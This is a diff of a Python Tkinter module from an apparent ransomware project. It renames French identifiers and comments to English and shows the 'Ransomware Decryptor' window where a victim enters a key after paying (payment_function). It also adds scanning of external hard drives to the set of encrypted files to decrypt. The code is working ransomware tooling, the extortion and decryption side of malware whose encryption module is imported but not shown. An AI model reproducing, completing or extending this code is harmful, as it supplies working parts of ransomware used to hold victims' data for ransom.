@@ -2,87 +2,98 @@
 from tkinter import *
 from tkinter.messagebox import *
 from functools import partial
-import threading
-import Crypto_files
+import threading, Crypto_files, List_external_HDD
 
 
 # Variable
 main_thread = threading.currentThread()
 
-# Fonction de déchiffrement
-def decrypt(clé, chemin):
-    # Récupération de la clé
-    if clé.get():
-        # transformation du type de la clé
-        key = bytes(clé.get().encode())
-        # Message de confirmation avant le démarrage du processus de déchiffrement
-        if askyesno("Titre 1", "Êtes-vous sûr de vouloir faire ça ?"
-                               "\nAvant toutes manipulations, assurez-vous d'avoir la bonne clé"
-                               "\nUne mauvaise clé ne fera qu'empirer les choses"
-                               "\nVous êtes prévenu !"):
-            # Retourne une liste des fichiers chiffrés et de leurs chemins
-            liste_des_fichiers_chiffrés = Crypto_files.listFiles(chemin)
+# Decrypting function
+def decrypt(key, path):
+    """
+    :param key:
+    :param path:
+    :return:
+    """
+    # retrieve the key
+    if key.get():
+        # Cast the key type to Byte
+        key = bytes(key.get().encode())
+        # Message to confirm before the decrypting process
+        if askyesno("Decrypting process", "Are you sure, you want to do that ?"
+                               "\nBefore doing this, be sure you have the right key"
+                               "\nA bad key will destroy your data and everything will be lost"
+                               "\nYou are now aware !"):
+
+            # Return an encrypt list files and their path
+            # BUG CORRECTION DU CHEMIN -> VOIR FICHIERS HDD EXTERNES
+            # FAIRE LE CHECK !!!!
+            encrypt_files_list_C = Crypto_files.list_files(path)
+            list_hdd = List_external_HDD.list_hdd_files()
+            list_all_files = list_hdd + encrypt_files_list_C
+
             # Variable de débugging (à retirer plus tard)
             j = 1
-            # Loop à travers ces fichiers
-            for fichier_chiffré in liste_des_fichiers_chiffrés:
-                # Print de débugging (à retirer)
+            # Loop through the files
+            for encrypt_file in list_all_files:
+                # Print for debugging purpose, to remove later
                 print("starting thread n°:" + str(j))
-                # Crée un thread par fichier pour accélérer le processus de déchiffrement
-                threading.Thread(target=Crypto_files.decryptionFunction, args=(key, fichier_chiffré)).start()
-                # Print de débugging (à retirer)
+                # Create a thread for each files to accelerate the decrypting process
+                threading.Thread(target=Crypto_files.decryption_function, args=(key, encrypt_file)).start()
+                # Print for debugging purpose, to remove later
                 print(threading.enumerate())
-                # Print de débugging (à retirer)
+                # Print for debugging purpose, to remove later
                 print("Finishing thread n°:" + str(j))
                 j += 1
-            # On s'assure que tous les thread sont terminés
+            # We check if all thread are finished
             for thread in threading.enumerate():
                 if thread is not main_thread:
                     thread.join()
-            # Message de fin
-            showinfo('Titre 1', 'Déchiffrement terminé !')
+            # Ending message
+            showinfo('Last step', 'Decrypting process finished !')
         else:
-            # Annulation du processus de déchiffrement
-            showinfo('Titre 1', 'Annulation...')
+            # Cancellation of the decrypting process
+            showinfo('Cancellation', 'Cancellation...')
     else:
-        # Message d'erreur si la clé est vide
-        showinfo('Titre 1', 'Veuillez, entrer une clé de déchiffrement !')
+        # Error message if the key is empty
+        showinfo('Error', 'Please enter a valid key !')
 
 
-def paymentFunction(chemin):
-    """ Interface graphique permettant de rentrer la clés de déchiffrement
+def payment_function(path):
     """
-    # Création de la fenêtre
-    fenetre = Tk()
-    # Ajout d'un titre
-    fenetre.title('Ransonware Decryptor')
-    # Chargement de l'icone
-    fenetre.iconbitmap("icone.ico")
+    Gui letting you enter the decrypting key
+    """
+    # Create a new window
+    main_window = Tk()
+    # Add a title
+    main_window.title('Ransomware Decryptor')
+    # Load the icon
+    main_window.iconbitmap("icone.ico")
 
-    # largeur et hauteur de la fenêtre
+    # Main window width and height
     l = 365
     h = 25
 
-    # largeur et hauteur de la fenêtre
-    largeur = fenetre.winfo_screenwidth()
-    hauteur = fenetre.winfo_screenheight()
+    # Width and height of a window
+    width = main_window.winfo_screenwidth()
+    height = main_window.winfo_screenheight()
 
-    # Calcul des coordonnés de x et y pour la fenêtre principale
-    x = (largeur / 2) - (l / 2)
-    y = (hauteur / 2) - (h / 2)
+    # Doing math to position the window
+    x = (width / 2) - (l / 2)
+    y = (height / 2) - (h / 2)
 
-    # Positionnement de la fenêtre
-    fenetre.geometry('%dx%d+%d+%d' % (l, h, x, y))
+    # Window position
+    main_window.geometry('%dx%d+%d+%d' % (l, h, x, y))
 
-    # Création de l'objet hébergeant le champs pour la clé
-    clé = Entry(fenetre, width=50)
-    # Ajout de cet objet dans la fenêtre
-    clé.grid(row=0, column=0)
-    # Focus sur l'objet
-    clé.focus_set()
-    # Création d'un bouton
-    bouton = Button(fenetre, text="déchiffrer", command=partial(decrypt, clé, chemin))
-    # Ajout du bouton dans la fenêtre
-    bouton.grid(row=0, column=1)
-    # Affichage de l'interface graphique
-    fenetre.mainloop()
+    # Create an object to enter the key
+    key = Entry(main_window, width=50)
+    # Add an object to the window
+    key.grid(row=0, column=0)
+    # Focus on the object
+    key.focus_set()
+    # Create a button
+    button = Button(main_window, text="decrypt", command=partial(decrypt, key, path))
+    # Adding a button to the window
+    button.grid(row=0, column=1)
+    # Displaying the GUI
+    main_window.mainloop()
